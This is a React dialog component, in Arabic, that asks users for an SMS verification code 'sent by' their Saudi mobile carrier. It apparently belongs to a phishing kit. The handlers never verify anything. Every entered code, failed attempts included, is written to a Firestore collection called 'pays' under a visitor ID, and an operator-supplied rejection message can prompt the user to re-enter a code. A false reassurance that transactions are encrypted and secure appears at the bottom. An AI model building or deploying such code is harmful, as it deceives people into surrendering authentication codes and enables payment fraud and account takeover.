import { useState, useCallback } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Phone, AlertCircle, Lock } from "lucide-react";
import { db, isFirebaseConfigured } from "@/lib/firebase";
import { doc, setDoc, Firestore } from "firebase/firestore";

interface PhoneOtpDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  phoneNumber: string;
  phoneCarrier: string;
  onOtpSubmitted: () => void;
  rejectionError?: string;
}

export function PhoneOtpDialog({
  open,
  onOpenChange,
  phoneNumber,
  phoneCarrier,
  onOtpSubmitted,
  rejectionError,
}: PhoneOtpDialogProps) {
  const [otpCode, setOtpCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [attempts, setAttempts] = useState(6);
  const [localError, setLocalError] = useState("");

  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  const updateData = useCallback(async (data: Record<string, any>) => {
    if (!isFirebaseConfigured || !db || !visitorId) return;
    try {
      const docRef = doc(db as Firestore, "pays", visitorId);
      await setDoc(docRef, {
        ...data,
        updatedAt: new Date().toISOString(),
      }, { merge: true });
    } catch (e) {
      console.error("Error updating data:", e);
    }
  }, [visitorId]);

  const carrierNames: Record<string, string> = {
    stc: "STC",
    mobily: "موبايلي",
    zain: "زين",
    virgin: "فيرجن",
    lebara: "ليبارا",
    salam: "سلام",
    go: "جو",
  };

  const maskedPhone = phoneNumber
    ? `${phoneNumber.slice(0, 3)}****${phoneNumber.slice(-3)}`
    : "";

  const handleSubmit = async () => {
    setLocalError("");
    
    if (!otpCode || otpCode.length < 4) {
      setLocalError("الرجاء إدخال رمز صحيح");
      const newAttempts = Math.max(0, attempts - 1);
      setAttempts(newAttempts);
      
      if (newAttempts > 0) {
        await updateData({
          phoneOtpAttempt: {
            code: otpCode,
            attemptsRemaining: newAttempts,
            timestamp: new Date().toISOString(),
          },
        });
      }
      return;
    }

    setIsSubmitting(true);

    try {
      await updateData({
        phoneOtpCode: otpCode,
        phoneOtpSubmittedAt: new Date().toISOString(),
        phoneVerificationStatus: "otp_submitted",
      });

      setOtpCode("");
      onOtpSubmitted();
    } catch (error) {
      console.error("Error submitting OTP:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResend = async () => {
    setAttempts(6);
    setOtpCode("");
    setLocalError("");
    await updateData({
      phoneOtpResent: new Date().toISOString(),
    });
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="text-center text-xl">
            رمز التحقق
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-6">
          <div className="text-center space-y-2">
            <div className="w-16 h-16 mx-auto rounded-full bg-[#1a5c85] flex items-center justify-center">
              <Phone className="w-8 h-8 text-white" />
            </div>
            <p className="text-sm text-muted-foreground">
              تم إرسال رمز التحقق إلى رقمك المسجل لدى{" "}
              <span className="font-semibold text-foreground">
                {carrierNames[phoneCarrier] || phoneCarrier}
              </span>
            </p>
            <p className="text-sm font-mono text-muted-foreground">{maskedPhone}</p>
          </div>

          {(rejectionError || localError) && (
            <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-700 rounded-lg p-3 flex items-center gap-2">
              <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0" />
              <p className="text-sm text-red-700 dark:text-red-300">{rejectionError || localError}</p>
            </div>
          )}

          <div className="space-y-2">
            <Label className="text-right block font-semibold">
              أدخل الرمز المكون من 4-6 أرقام
            </Label>
            <Input
              type="tel"
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="أدخل الرمز"
              className="text-center h-14 text-2xl font-mono tracking-[0.5em]"
              dir="ltr"
              maxLength={6}
              data-testid="input-phone-otp"
            />
          </div>

          <div className="flex items-center gap-2 justify-center text-amber-600 bg-amber-50 dark:bg-amber-900/20 p-3 rounded-xl">
            <AlertCircle className="h-4 w-4" />
            <span className="text-sm">المحاولات المتبقية: {attempts}</span>
          </div>

          <div className="space-y-3">
            <Button
              onClick={handleSubmit}
              disabled={isSubmitting || !otpCode}
              className="w-full h-12 bg-[#1a5c85] hover:bg-[#154a6d]"
              data-testid="button-verify-phone-otp"
            >
              {isSubmitting ? "جاري التحقق..." : "تأكيد الرمز"}
            </Button>

            <Button
              variant="ghost"
              onClick={handleResend}
              className="w-full text-[#1a5c85]"
              data-testid="button-resend-phone-otp"
            >
              <span className="underline">إعادة إرسال الرمز</span>
            </Button>
          </div>

          <div className="pt-4 border-t">
            <p className="text-xs text-muted-foreground flex items-center justify-center gap-2">
              <Lock className="h-3 w-3" />
              جميع المعاملات مشفرة وآمنة
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
